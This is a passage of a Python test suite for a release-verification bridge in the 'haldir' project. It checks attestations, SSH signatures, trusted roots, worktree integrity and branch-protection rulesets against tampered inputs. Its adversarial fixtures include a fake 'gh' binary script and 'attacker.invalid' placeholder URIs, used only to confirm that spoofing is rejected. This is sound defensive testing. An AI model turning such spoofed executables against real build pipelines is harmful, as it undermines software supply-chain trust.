                    PROTOCOL.canonical_json_bytes(value, pretty=True),
                    materials,
                )

    def test_result_expected_integer_arguments_reject_coercion(self) -> None:
        payload, materials = result_payload()
        for label, arguments in (
            ("run_id_bool", {"run_id": True}),
            ("run_id_float", {"run_id": float(RUN_ID)}),
            ("attempt_bool", {"attempt": True}),
            ("attempt_float", {"attempt": float(ATTEMPT)}),
            ("number_bool", {"run_number": True}),
            ("number_float", {"run_number": float(RUN_NUMBER)}),
        ):
            with (
                self.subTest(label=label),
                self.assertRaisesRegex(ValueError, "RESULT_IDENTITY"),
            ):
                self.validate_result(payload, materials, **arguments)

    def test_artifact_integer_and_boolean_fields_reject_coercion(self) -> None:
        payload, _materials = result_payload()
        mutations = (
            ("id", ("id",), 9_001),
            ("size", ("size_in_bytes",), len(payload)),
            (
                "head_repository_id",
                ("workflow_run", "head_repository_id"),
                PROTOCOL.REPOSITORY_ID,
            ),
            ("run_id", ("workflow_run", "id"), RUN_ID),
            (
                "repository_id",
                ("workflow_run", "repository_id"),
                PROTOCOL.REPOSITORY_ID,
            ),
        )
        for label, path, valid in mutations:
            for invalid in (True, float(valid)):
                value = artifact(payload)
                target: Any = value
                for component in path[:-1]:
                    target = target[component]
                target[path[-1]] = invalid
                with (
                    self.subTest(label=label, invalid=invalid),
                    self.assertRaisesRegex(ValueError, "FR0017_"),
                ):
                    self.validate_artifact(value, payload)
        value = artifact(payload)
        value["expired"] = 0
        with self.assertRaisesRegex(ValueError, "ARTIFACT_IDENTITY"):
            self.validate_artifact(value, payload)

    def test_artifact_expected_integer_arguments_reject_coercion(self) -> None:
        payload, _materials = result_payload()
        for label, arguments in (
            ("run_id_bool", {"run_id": True}),
            ("run_id_float", {"run_id": float(RUN_ID)}),
            ("attempt_bool", {"attempt": True}),
            ("attempt_float", {"attempt": float(ATTEMPT)}),
        ):
            with (
                self.subTest(label=label),
                self.assertRaisesRegex(ValueError, "FR0017_INTEGER"),
            ):
                self.validate_artifact(artifact(payload), payload, **arguments)

    def test_artifact_listing_count_rejects_bool_and_float(self) -> None:
        payload, _materials = result_payload()
        listed = artifact(payload)
        self.assertEqual(
            PROTOCOL.validate_artifact_listing(
                {"artifacts": [listed], "total_count": 1}
            ),
            listed,
        )
        for invalid in (True, 1.0):
            with (
                self.subTest(invalid=invalid),
                self.assertRaisesRegex(ValueError, "FR0017_INTEGER"),
            ):
                PROTOCOL.validate_artifact_listing(
                    {"artifacts": [listed], "total_count": invalid}
                )

    def test_artifact_one_second_tolerance_is_exact(self) -> None:
        payload, _materials = result_payload()
        value = artifact(payload)
        value["created_at"] = utc(12, 0, 59)
        value["updated_at"] = utc(12, 4, 1)
        self.validate_artifact(value, payload)

        value = artifact(payload)
        value["created_at"] = utc_fraction(12, 0, 58, 999_999)
        with self.assertRaisesRegex(ValueError, "ARTIFACT_CHRONOLOGY"):
            self.validate_artifact(value, payload)

        value = artifact(payload)
        value["updated_at"] = utc_fraction(12, 4, 1, 1)
        with self.assertRaisesRegex(ValueError, "ARTIFACT_CHRONOLOGY"):
            self.validate_artifact(value, payload)


class AttestationTests(unittest.TestCase):
    def validate(self, bundle: bytes, receipt: list) -> dict:
        payload, _materials = result_payload()
        return PROTOCOL.validate_attestation_evidence(
            bundle,
            receipt,
            workflow="ci",
            result_payload=payload,
            subject_commit=COMMIT,
            expected_ref="refs/heads/main",
            run_id=RUN_ID,
            attempt=ATTEMPT,
            attestation_started=datetime(2026, 7, 29, 12, 6, tzinfo=timezone.utc),
            attestation_completed=datetime(2026, 7, 29, 12, 8, tzinfo=timezone.utc),
        )

    def test_public_good_tlog_receipt_is_valid(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        result = self.validate(bundle, receipt)
        self.assertEqual(result["transparency_log"]["type"], "Tlog")

    def test_transparency_log_type_mutation_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        receipt[0]["verificationResult"]["verifiedTimestamps"][0]["type"] = (
            "TransparencyLog"
        )
        with self.assertRaisesRegex(ValueError, "TRANSPARENCY_LOG"):
            self.validate(bundle, receipt)

    def test_unpinned_log_uri_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        receipt[0]["verificationResult"]["verifiedTimestamps"][0]["uri"] = (
            "attacker.invalid"
        )
        with self.assertRaisesRegex(ValueError, "TRANSPARENCY_LOG"):
            self.validate(bundle, receipt)

    def test_scheme_less_log_uri_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        receipt[0]["verificationResult"]["verifiedTimestamps"][0]["uri"] = (
            "rekor.sigstore.dev"
        )
        with self.assertRaisesRegex(ValueError, "TRANSPARENCY_LOG"):
            self.validate(bundle, receipt)

    def test_capability_url_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        receipt[0]["attestation"]["bundle_url"] = "https://example.invalid/token"
        with self.assertRaisesRegex(ValueError, "RECEIPT_BUNDLE"):
            self.validate(bundle, receipt)

    def test_cross_attempt_statement_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload, attempt=1)
        with self.assertRaisesRegex(ValueError, "STATEMENT_MISMATCH"):
            self.validate(bundle, receipt)

    def test_cross_attempt_certificate_is_rejected_independently(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        receipt[0]["verificationResult"]["signature"]["certificate"][
            "runInvocationURI"
        ] = f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}/attempts/1"
        with self.assertRaisesRegex(ValueError, "ATTESTATION_CERTIFICATE"):
            self.validate(bundle, receipt)

    def test_witness_outside_attestation_job_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        receipt[0]["verificationResult"]["verifiedTimestamps"][0]["timestamp"] = utc(
            12, 9
        )
        with self.assertRaisesRegex(ValueError, "TRANSPARENCY_LOG_TIME"):
            self.validate(bundle, receipt)


class TrustedRootAndCommandTests(unittest.TestCase):
    def test_signed_fr0016_repair_boundary_is_verified_directly(self) -> None:
        BRIDGE._verify_legacy_boundary(ROOT)

    def test_fr0016_plan_semantics_and_detached_signature_are_verified(self) -> None:
        original = BRIDGE._read_json

        def tampered(repo: Path, commit: str, path: str) -> tuple[dict, bytes]:
            value, payload = original(repo, commit, path)
            if path == BRIDGE.FR0016_PLAN_PATH:
                value = copy.deepcopy(value)
                value["defects"] = value["defects"][:-1]
            return value, payload

        with (
            mock.patch.object(BRIDGE, "_read_json", side_effect=tampered),
            self.assertRaisesRegex(RuntimeError, "FR0017_FR0016_PLAN_STATE"),
        ):
            BRIDGE._verify_legacy_boundary(ROOT)

    def test_signer_worktree_is_admitted_before_signature_verification(self) -> None:
        signer = BRIDGE.FR0016_BOUNDARY_RECORDS[BRIDGE.ALLOWED_SIGNERS_PATH]
        record = {
            "path": BRIDGE.ALLOWED_SIGNERS_PATH,
            "git_object_type": "blob",
            **signer,
        }
        commit_verifier = mock.Mock(side_effect=AssertionError("signature reached"))
        with (
            mock.patch.object(
                BRIDGE,
                "_metadata",
                return_value={"tree": BRIDGE.PARENT_TREE},
            ),
            mock.patch.object(BRIDGE, "file_record", return_value=record),
            mock.patch.object(
                BRIDGE,
                "_verify_worktree",
                side_effect=BRIDGE.BridgeError("FR0017_WORKTREE:allowed-signers"),
            ),
            mock.patch.object(BRIDGE, "_verify_commit_identity", commit_verifier),
            self.assertRaisesRegex(RuntimeError, "FR0017_WORKTREE"),
        ):
            BRIDGE._verify_legacy_boundary(ROOT)
        commit_verifier.assert_not_called()

    def test_real_openssh_detached_signature_is_accepted(self) -> None:
        payload = b"FR-0017 detached signature parser integration\n"
        namespace = "haldir-fr0017-openssh-integration"
        principal = "fixture@example.invalid"
        with tempfile.TemporaryDirectory() as name:
            repo = Path(name)
            private_key = repo / "signing-key"
            subprocess.run(
                [
                    "/usr/bin/ssh-keygen",
                    "-q",
                    "-t",
                    "ed25519",
                    "-N",
                    "",
                    "-C",
                    principal,
                    "-f",
                    str(private_key),
                ],
                check=True,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            public_key = private_key.with_suffix(".pub")
            fingerprint = (
                subprocess.check_output(["/usr/bin/ssh-keygen", "-lf", str(public_key)])
                .decode("ascii")
                .split()[1]
            )
            allowed_signers = repo / BRIDGE.ALLOWED_SIGNERS_PATH
            allowed_signers.parent.mkdir(parents=True)
            allowed_signers.write_text(
                f'{principal} namespaces="{namespace}" '
                f"{public_key.read_text(encoding='ascii')}",
                encoding="ascii",
            )
            payload_path = repo / "payload"
            payload_path.write_bytes(payload)
            subprocess.run(
                [
                    "/usr/bin/ssh-keygen",
                    "-Y",
                    "sign",
                    "-f",
                    str(private_key),
                    "-n",
                    namespace,
                    str(payload_path),
                ],
                check=True,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            signature = Path(f"{payload_path}.sig").read_text(encoding="ascii")
            record = {
                "format": "ssh",
                "namespace": namespace,
                "principal": principal,
                "key_fingerprint": fingerprint,
                "signature": signature,
            }
            original_principal = BRIDGE.SIGNER_PRINCIPAL
            original_fingerprint = BRIDGE.SIGNER_FINGERPRINT
            try:
                BRIDGE.SIGNER_PRINCIPAL = principal
                BRIDGE.SIGNER_FINGERPRINT = fingerprint
                BRIDGE._verify_detached(repo, record, payload, namespace=namespace)
            finally:
                BRIDGE.SIGNER_PRINCIPAL = original_principal
                BRIDGE.SIGNER_FINGERPRINT = original_fingerprint

    def test_non_ascii_detached_signature_is_domain_rejected(self) -> None:
        record = {
            "format": "ssh",
            "namespace": BRIDGE.PLAN_NAMESPACE,
            "principal": BRIDGE.SIGNER_PRINCIPAL,
            "key_fingerprint": BRIDGE.SIGNER_FINGERPRINT,
            "signature": "\N{SNOWMAN}",
        }
        with self.assertRaisesRegex(
            BRIDGE.BridgeError,
            "FR0017_DETACHED_SIGNATURE",
        ):
            BRIDGE._verify_detached(
                ROOT,
                record,
                b"unsigned",
                namespace=BRIDGE.PLAN_NAMESPACE,
            )

    def test_source_authority_file_is_frozen(self) -> None:
        self.assertIn(
            BRIDGE.ALLOWED_SIGNERS_PATH,
            BRIDGE.FR0016_BOUNDARY_RECORDS,
        )
        self.assertIn(
            BRIDGE.ALLOWED_SIGNERS_PATH,
            BRIDGE.PROTECTED_AFTER_ACTIVATION,
        )
        self.assertTrue(
            BRIDGE.HISTORICAL_RECOVERY_TOOL_PATHS <= BRIDGE.PROTECTED_AFTER_ACTIVATION
        )

    def test_commit_verification_ignores_configured_ssh_program(self) -> None:
        command = BRIDGE._verify_commit_argv(Path("/repo"), COMMIT)
        self.assertIn("gpg.ssh.program=/usr/bin/ssh-keygen", command)
        self.assertIn(
            "gpg.ssh.allowedSignersFile=/repo/release/0.9.0/allowed-signers",
            command,
        )

    def test_exact_public_good_root(self) -> None:
        payload = (ROOT / BRIDGE.TRUSTED_ROOT_PATH).read_bytes()
        BRIDGE._validate_trusted_root(payload)
        self.assertEqual(
            hashlib.sha256(payload).hexdigest(), BRIDGE.TRUSTED_ROOT_SHA256
        )

    def test_local_gh_requires_the_exact_macos_binary_identity(self) -> None:
        self.assertEqual(BRIDGE.GH_CLI_MACOS_ARM64_ARCHIVE_BYTES, 13_950_131)
        self.assertEqual(
            BRIDGE.GH_CLI_MACOS_ARM64_ARCHIVE_SHA256,
            "f23a0c37d963aacc3bed703ccbd59b41c5ca22101fab7f00eb2b7cad23aba463",
        )
        self.assertEqual(BRIDGE.GH_CLI_MACOS_ARM64_BINARY_BYTES, 38_817_216)
        self.assertEqual(
            BRIDGE.GH_CLI_MACOS_ARM64_BINARY_SHA256,
            "b1d6c442fde99ca27c04e1e74d624895abe37785f4a3e9e9b684bf7586ce4bc8",
        )
        with tempfile.TemporaryDirectory() as name:
            spoof = Path(name) / "gh"
            spoof.write_text(
                "#!/bin/sh\nprintf '%s\\n' 'gh version 2.96.0 (2026-07-02)'\n",
                encoding="ascii",
            )
            spoof.chmod(0o700)
            with (
                mock.patch.object(BRIDGE.sys, "platform", "darwin"),
                mock.patch.dict(
                    BRIDGE.os.environ,
                    {"HALDIR_FR0017_GH": str(spoof)},
                    clear=False,
                ),
                self.assertRaisesRegex(RuntimeError, "GH_EXECUTABLE"),
            ):
                BRIDGE._trusted_gh()

    def test_root_byte_substitution_is_rejected(self) -> None:
        payload = bytearray((ROOT / BRIDGE.TRUSTED_ROOT_PATH).read_bytes())
        payload[100] ^= 1
        with self.assertRaisesRegex(RuntimeError, "TRUSTED_ROOT_BOUND"):
            BRIDGE._validate_trusted_root(bytes(payload))

    def test_offline_verification_argv_is_exact(self) -> None:
        command = BRIDGE._verification_argv(
            executable=Path("/usr/bin/gh"),
            result_path=Path("/tmp/result"),
            bundle_path=Path("/tmp/bundle"),
            trusted_root_path=Path("/tmp/root"),
            workflow="ci",
            subject_commit=COMMIT,
        )
        for flag in (
            "--bundle",
            "--custom-trusted-root",
            "--cert-identity",
            "--cert-oidc-issuer",
            "--deny-self-hosted-runners",
            "--predicate-type",
            "--signer-digest",
            "--source-digest",
            "--source-ref",
        ):
            self.assertEqual(command.count(flag), 1)
        self.assertNotIn("--no-public-good", command)
        self.assertNotIn("--signer-workflow", command)
        self.assertIn(COMMIT, command)

    def test_offline_verification_environment_is_deterministic(self) -> None:
        environment = BRIDGE._offline_verification_environment(
            executable=Path("/opt/gh/bin/gh"),
            root=Path("/tmp/root"),
            config_dir=Path("/tmp/root/config"),
        )
        self.assertEqual(environment["TZ"], "UTC")
        self.assertEqual(environment["LC_ALL"], "C")
        self.assertEqual(environment["PATH"], "/opt/gh/bin:/usr/bin:/bin")
        self.assertEqual(environment["NO_PROXY"], "")
        self.assertEqual(
            {
                environment["ALL_PROXY"],
                environment["HTTPS_PROXY"],
                environment["HTTP_PROXY"],
            },
            {"http://127.0.0.1:1"},
        )
        self.assertNotIn("LANG", environment)

    def test_hosted_commands_use_exact_artifact_id(self) -> None:
        commands = BRIDGE._hosted_commands(
            workflow="ci",
            run_id=RUN_ID,
            attempt=ATTEMPT,
            artifact_id=9001,
        )
        self.assertIn("/artifacts/9001/zip", commands["artifact_download"])
        self.assertIn("/artifacts/9001", commands["artifact_get"])
        self.assertNotIn("gh run download", commands["artifact_download"])
        self.assertIn("attempt-2.json", commands["artifact_list"])


class WorktreeIntegrityTests(unittest.TestCase):
    def test_executable_drift_and_unsafe_write_bits_are_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            repo = Path(name)
            subprocess.run(
                ["/usr/bin/git", "init", "-q", repo],
                check=True,
            )
            protected = repo / "protected.txt"
            protected.write_text("frozen\n")
            environment = {
                **os.environ,
                "GIT_AUTHOR_NAME": "Test",
                "GIT_AUTHOR_EMAIL": "test@example.invalid",
                "GIT_COMMITTER_NAME": "Test",
                "GIT_COMMITTER_EMAIL": "test@example.invalid",
                "GIT_CONFIG_GLOBAL": os.devnull,
                "GIT_CONFIG_NOSYSTEM": "1",
            }
            subprocess.run(
                ["/usr/bin/git", "-C", repo, "add", "protected.txt"],
                check=True,
                env=environment,
            )
            subprocess.run(
                [
                    "/usr/bin/git",
                    "-C",
                    repo,
                    "-c",
                    "commit.gpgsign=false",
                    "commit",
                    "-q",
                    "-m",
                    "fixture",
                ],
                check=True,
                env=environment,
            )
            commit = (
                subprocess.check_output(
                    ["/usr/bin/git", "-C", repo, "rev-parse", "HEAD"],
                    env=environment,
                )
                .decode()
                .strip()
            )
            os.chmod(protected, 0o644)
            BRIDGE._verify_worktree(repo, commit, ["protected.txt"])
            for mode in (0o755, 0o666):
                with self.subTest(mode=oct(mode)):
                    os.chmod(protected, mode)
                    with self.assertRaisesRegex(RuntimeError, "FR0017_WORKTREE"):
                        BRIDGE._verify_worktree(repo, commit, ["protected.txt"])
            os.chmod(protected, 0o644)
            protected.unlink()
            protected.symlink_to("missing-target")
            with self.assertRaisesRegex(RuntimeError, "FR0017_WORKTREE"):
                BRIDGE._verify_worktree(repo, commit, ["protected.txt"])

    def test_fr0016_completion_lookalike_is_rejected_before_activation(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            repo = Path(name)
            subprocess.run(["/usr/bin/git", "init", "-q", repo], check=True)
            bad = (
                repo / "release/0.9.0/current-head/evidence/"
                "FRAMEWORK-RECOVERY-FR-0016-r-ci-capture.json"
            )
            bad.parent.mkdir(parents=True)
            bad.write_text("{}\n", encoding="ascii")
            environment = {
                **os.environ,
                "GIT_AUTHOR_NAME": "Test",
                "GIT_AUTHOR_EMAIL": "test@example.invalid",
                "GIT_COMMITTER_NAME": "Test",
                "GIT_COMMITTER_EMAIL": "test@example.invalid",
                "GIT_CONFIG_GLOBAL": os.devnull,
                "GIT_CONFIG_NOSYSTEM": "1",
            }
            subprocess.run(
                ["/usr/bin/git", "-C", repo, "add", "."],
                check=True,
                env=environment,
            )
            subprocess.run(
                [
                    "/usr/bin/git",
                    "-C",
                    repo,
                    "-c",
                    "commit.gpgsign=false",
                    "commit",
                    "-q",
                    "-m",
                    "fixture",
                ],
                check=True,
                env=environment,
            )
            commit = (
                subprocess.check_output(
                    ["/usr/bin/git", "-C", repo, "rev-parse", "HEAD"],
                    env=environment,
                )
                .decode("ascii")
                .strip()
            )
            with self.assertRaisesRegex(
                RuntimeError,
                "FR0017_FR0016_COMPLETION_LOOKALIKE",
            ):
                BRIDGE._assert_absent(repo, commit, ())


class RulesetTests(unittest.TestCase):
    def fixture(self) -> tuple[dict, list, dict, list, list, dict]:
        return repository_identity(), *ruleset_documents()

    def test_owner_only_main_ruleset(self) -> None:
        result = BRIDGE.validate_main_writer_ruleset(*self.fixture())
        self.assertEqual(result["owner_user_id"], 10_104_569)
        self.assertEqual(result["observed_get_rule"], {"type": "update"})
        self.assertFalse(result["omitted_update_parameter_reconstructed"])
        self.assertNotIn("write_rule", result)
        self.assertIn("GITHUB_APPS", result["protects_against"])

    def test_additional_bypass_actor_is_rejected(self) -> None:
        repository, summary, detail, effective, history, version = self.fixture()
        detail["bypass_actors"].append(
            {"actor_id": 99, "actor_type": "User", "bypass_mode": "always"}
        )
        with self.assertRaisesRegex(RuntimeError, "RULESET_"):
            BRIDGE.validate_main_writer_ruleset(
                repository,
                summary,
                detail,
                effective,
                history,
                version,
            )

    def test_live_get_rule_requires_parameter_omission(self) -> None:
        explicit_values = (False, True, None, {}, 0, 0.0)
        for document in ("detail", "effective", "version"):
            for explicit in explicit_values:
                fixture = list(self.fixture())
                selected = {
                    "detail": fixture[2]["rules"][0],
                    "effective": fixture[3][0],
                    "version": fixture[5]["state"]["rules"][0],
                }[document]
                selected["parameters"] = copy.deepcopy(explicit)
                with (
                    self.subTest(document=document, explicit=explicit),
                    self.assertRaisesRegex(RuntimeError, "RULESET_"),
                ):
                    BRIDGE.validate_main_writer_ruleset(*fixture)
            fixture = list(self.fixture())
            selected = {
                "detail": fixture[2]["rules"][0],
                "effective": fixture[3][0],
                "version": fixture[5]["state"]["rules"][0],
            }[document]
            selected["unexpected"] = False
            with (
                self.subTest(document=document, explicit="extra"),
                self.assertRaisesRegex(RuntimeError, "RULESET_"),
            ):
                BRIDGE.validate_main_writer_ruleset(*fixture)

    def test_ruleset_integer_fields_reject_bool_and_float(self) -> None:
        mutations = (
            (
                "summary_id",
                lambda fixture, value: fixture[1][0].__setitem__("id", value),
                8_181,
            ),
            (
                "detail_id",
                lambda fixture, value: fixture[2].__setitem__("id", value),
                8_181,
            ),
            (
                "actor_id",
                lambda fixture, value: fixture[2]["bypass_actors"][0].__setitem__(
                    "actor_id", value
                ),
                BRIDGE.MAIN_RULESET_OWNER_ID,
            ),
            (
                "effective_id",
                lambda fixture, value: fixture[3][0].__setitem__("ruleset_id", value),
                8_181,
            ),
            (
                "history_version_id",
                lambda fixture, value: fixture[4][0].__setitem__("version_id", value),
                9_191,
            ),
            (
                "history_actor_id",
                lambda fixture, value: fixture[4][0]["actor"].__setitem__("id", value),
                BRIDGE.MAIN_RULESET_OWNER_ID,
            ),
            (
                "version_id",
                lambda fixture, value: fixture[5].__setitem__("version_id", value),
                9_191,
            ),
            (
                "version_actor_id",
                lambda fixture, value: fixture[5]["actor"].__setitem__("id", value),
                BRIDGE.MAIN_RULESET_OWNER_ID,
            ),
            (
                "version_state_id",
                lambda fixture, value: fixture[5]["state"].__setitem__("id", value),
                8_181,
            ),
            (
                "version_state_actor_id",
                lambda fixture, value: fixture[5]["state"]["bypass_actors"][
                    0
                ].__setitem__("actor_id", value),
                BRIDGE.MAIN_RULESET_OWNER_ID,
            ),
        )
        for label, mutate, valid in mutations:
            for invalid in (True, float(valid)):
                fixture = list(self.fixture())
                mutate(fixture, invalid)
                with (
                    self.subTest(label=label, invalid=invalid),
                    self.assertRaisesRegex(RuntimeError, "RULESET_"),
                ):
                    BRIDGE.validate_main_writer_ruleset(*fixture)

    def test_history_version_is_strictly_cross_linked(self) -> None:
        mutations = (
            lambda fixture: fixture[5]["actor"].__setitem__("id", 99),
            lambda fixture: fixture[5].__setitem__(
                "updated_at", "2026-07-29T20:59:52.000+02:00"
            ),
            lambda fixture: fixture[5]["state"].__setitem__("id", 99),
            lambda fixture: fixture[5]["state"].__setitem__("updated_at", False),
            lambda fixture: fixture[4].append(copy.deepcopy(fixture[4][0])),
        )
        for index, mutate in enumerate(mutations):
            fixture = list(self.fixture())
            mutate(fixture)
            with (
                self.subTest(index=index),
                self.assertRaisesRegex(RuntimeError, "RULESET_"),
            ):
                BRIDGE.validate_main_writer_ruleset(*fixture)

    def test_authority_fields_require_exact_json_types(self) -> None:
        authority = BRIDGE._authority("PENDING_QUALIFICATION")
        BRIDGE._validate_authority(
            authority,
            state="PENDING_QUALIFICATION",
        )
        attacks = (
            ("framework_epoch", 15.0),
            ("release_authorized", 0),
            ("deployment_authorized", 0.0),
        )
        for field, invalid in attacks:
            mutated = copy.deepcopy(authority)
            mutated[field] = invalid
            with (
                self.subTest(field=field),
                self.assertRaisesRegex(RuntimeError, "AUTHORITY_SCHEMA"),
            ):
                BRIDGE._validate_authority(
                    mutated,
                    state="PENDING_QUALIFICATION",
                )

    def test_non_main_condition_is_rejected(self) -> None:
        repository, summary, detail, effective, history, version = self.fixture()
        detail["conditions"]["ref_name"]["include"] = ["~ALL"]
        with self.assertRaisesRegex(RuntimeError, "RULESET_"):
            BRIDGE.validate_main_writer_ruleset(
                repository,
                summary,
                detail,
                effective,
                history,
                version,
            )


class BranchProtectionRecordTests(unittest.TestCase):
    def validate(self, value: dict) -> dict:
        containing_commit = "c" * 40

        def metadata(_repo: Path, commit: str) -> dict[str, str]:
            hour = 11 if commit == COMMIT else 13
            return {"committer_date": f"2026-07-29T{hour:02d}:00:00+00:00"}

        with (
            mock.patch.object(BRIDGE, "_read_json", return_value=(value, b"")),
            mock.patch.object(BRIDGE, "_metadata", side_effect=metadata),
        ):
            return BRIDGE._verify_branch_protection(
                ROOT,
                containing_commit,
                COMMIT,
            )

    def test_exact_branch_control_record(self) -> None:
        result = self.validate(branch_protection_record())
        self.assertEqual(result["validated_ruleset_policy"]["id"], 8_181)

    def test_branch_repository_and_check_ids_reject_coercion(self) -> None:
        for invalid in (True, 1_292_802_592.0):
            value = branch_protection_record()
            value["repository"]["id"] = invalid
            with (
                self.subTest(field="repository.id", invalid=invalid),
                self.assertRaisesRegex(RuntimeError, "REPOSITORY_IDENTITY"),
            ):
                self.validate(value)
        for invalid in (True, float(BRIDGE.MAIN_RULESET_OWNER_ID)):
            value = branch_protection_record()
            value["repository"]["owner"]["id"] = invalid
            with (
                self.subTest(field="repository.owner.id", invalid=invalid),
                self.assertRaisesRegex(RuntimeError, "REPOSITORY_IDENTITY"),
            ):
                self.validate(value)
        for invalid in (True, float(BRIDGE.GITHUB_ACTIONS_APP_ID)):
            value = branch_protection_record()
            value["protection"]["required_status_checks"]["checks"][0]["app_id"] = (
                invalid
            )
            with (
                self.subTest(field="app_id", invalid=invalid),
                self.assertRaisesRegex(RuntimeError, "BRANCH_PROTECTION_POLICY"),
            ):
                self.validate(value)

    def test_branch_authority_and_policy_bools_reject_integer_aliases(self) -> None:
        for field in (
            "cryptographic_proof",
            "durable_external_state_proof",
            "release_authority",
        ):
            value = branch_protection_record()
            value["authority"][field] = 0
            with (
                self.subTest(authority=field),
                self.assertRaisesRegex(RuntimeError, "BRANCH_PROTECTION_SCHEMA"),
            ):
                self.validate(value)
        for field in (
            "enforce_admins",
            "required_linear_history",
            "required_signatures",
            "allow_force_pushes",
            "allow_deletions",
            "block_creations",
            "required_conversation_resolution",
            "lock_branch",
            "allow_fork_syncing",
        ):
            for invalid in (0, 1, 0.0, 1.0):
                value = branch_protection_record()
                value["protection"][field]["enabled"] = invalid
                with (
                    self.subTest(policy=field, invalid=invalid),
                    self.assertRaisesRegex(RuntimeError, "BRANCH_PROTECTION_POLICY"),
                ):
                    self.validate(value)

    def test_repository_identity_is_exact_nonfork_without_source(self) -> None:
        for field in ("fork", "has_parent", "has_source"):
            for invalid in (True, 0, 0.0, None):
                value = branch_protection_record()
                value["repository"][field] = invalid
                with (
                    self.subTest(field=field, invalid=invalid),
                    self.assertRaisesRegex(RuntimeError, "REPOSITORY_IDENTITY"),
                ):
                    self.validate(value)
        for field in ("parent", "source"):
            value = branch_protection_record()
            value["repository"][field] = None
            with (
                self.subTest(explicit_presence=field),
                self.assertRaisesRegex(RuntimeError, "REPOSITORY_IDENTITY"),
            ):
                self.validate(value)

    def test_protection_get_shape_is_exact_and_materialized(self) -> None:
        contexts = sorted(BRIDGE.REQUIRED_PRE_ACCEPT_CHECKS)
        self.assertEqual(
            BRIDGE.BRANCH_PROTECTION_EXPECTED_POLICY,
            {
                "required_signatures": {"enabled": True},
                "required_status_checks": {
                    "strict": True,
                    "checks": [
                        {
                            "context": context,
                            "app_id": BRIDGE.GITHUB_ACTIONS_APP_ID,
                        }
                        for context in contexts
                    ],
                },
                "enforce_admins": True,
                "required_pull_request_reviews": None,
                "restrictions": None,
                "required_linear_history": True,
                "allow_force_pushes": False,
                "allow_deletions": False,
                "block_creations": False,
                "required_conversation_resolution": False,
                "lock_branch": False,
                "allow_fork_syncing": False,
            },
        )
        self.assertNotIn(
            "contexts",
            BRIDGE.BRANCH_PROTECTION_EXPECTED_POLICY["required_status_checks"],
        )
        value = branch_protection_record()
        self.assertIn(
            "contexts",
            value["protection"]["required_status_checks"],
        )
        value["protection"]["required_status_checks"]["extra"] = None
        with self.assertRaisesRegex(RuntimeError, "BRANCH_PROTECTION_POLICY"):
            self.validate(value)
        for invalid in (0, 1, 0.0, 1.0):
            value = branch_protection_record()
            value["protection"]["required_status_checks"]["strict"] = invalid
            with (
                self.subTest(strict=invalid),
                self.assertRaisesRegex(RuntimeError, "BRANCH_PROTECTION_POLICY"),
            ):
                self.validate(value)


class WorkflowAndPinTests(unittest.TestCase):
    def test_epoch18_authority_cannot_inherit_epoch16(self) -> None:
        authority = BRIDGE._authority("ACTIVE")
        self.assertEqual(authority["framework_epoch"], 18)
        stale = copy.deepcopy(authority)
        stale["framework_epoch"] = 17
        with self.assertRaisesRegex(RuntimeError, "AUTHORITY_SCHEMA"):
            BRIDGE._validate_authority(stale, state="ACTIVE")

    def test_rqa_scopes_are_exact_append_only(self) -> None:
        self.assertEqual(
            BRIDGE.REPAIR_STATUSES,
            {
                BRIDGE.CI_WORKFLOW_PATH: "M",
                BRIDGE.FORMAL_WORKFLOW_PATH: "M",
                BRIDGE.PLAN_PATH: "A",
                BRIDGE.PIN_VERIFIER_PATH: "M",
                BRIDGE.CARGO_DENY_TEST_PATH: "M",
                BRIDGE.GATE_PATH: "M",
                BRIDGE.MODULE_PATH: "A",
                BRIDGE.CAPTURE_PATH: "A",
                BRIDGE.RESULT_PATH: "A",
                BRIDGE.BRIDGE_PATH: "A",
                BRIDGE.TEST_PATH: "A",
            },
        )
        self.assertEqual(
            BRIDGE.QUALIFICATION_STATUSES,
            {
                BRIDGE.QUALIFICATION_PATH: "A",
                **{path: "A" for path in BRIDGE.QUALIFICATION_EVIDENCE_PATHS},
            },
        )
        self.assertEqual(
            BRIDGE.ACTIVATION_STATUSES,
            {
                BRIDGE.ACTIVATION_PATH: "A",
                **{path: "A" for path in BRIDGE.ACTIVATION_EVIDENCE_PATHS},
            },
        )
        all_stage_paths = (
            set(BRIDGE.REPAIR_STATUSES)
            | set(BRIDGE.QUALIFICATION_STATUSES)
            | set(BRIDGE.ACTIVATION_STATUSES)
        )
        self.assertFalse(all_stage_paths & BRIDGE.HISTORICAL_RECOVERY_TOOL_PATHS)
        self.assertEqual(
            BRIDGE.PLAN_NAMESPACE,
            "haldir-framework-recovery-fr-0017-plan-v1",
        )
        self.assertEqual(
            BRIDGE.QUALIFICATION_NAMESPACE,
            "haldir-framework-recovery-fr-0017-qualification-v1",
        )
        self.assertEqual(
            BRIDGE.ACTIVATION_NAMESPACE,
            "haldir-framework-recovery-fr-0017-activation-v1",
        )
        self.assertEqual(
            BRIDGE.FR0015_PLAN_NAMESPACE,
            "haldir-framework-recovery-fr-0015-plan-v1",
        )
        self.assertEqual(
            BRIDGE.FR0015_QUALIFICATION_NAMESPACE,
            "haldir-framework-recovery-fr-0015-qualification-v1",
        )
        self.assertEqual(
            BRIDGE.FR0015_ACTIVATION_NAMESPACE,
            "haldir-framework-recovery-fr-0015-activation-v1",
        )
        self.assertEqual(
            len(
                {
                    BRIDGE.PLAN_NAMESPACE,
                    BRIDGE.QUALIFICATION_NAMESPACE,
                    BRIDGE.ACTIVATION_NAMESPACE,
                    BRIDGE.FR0015_PLAN_NAMESPACE,
                    BRIDGE.FR0015_QUALIFICATION_NAMESPACE,
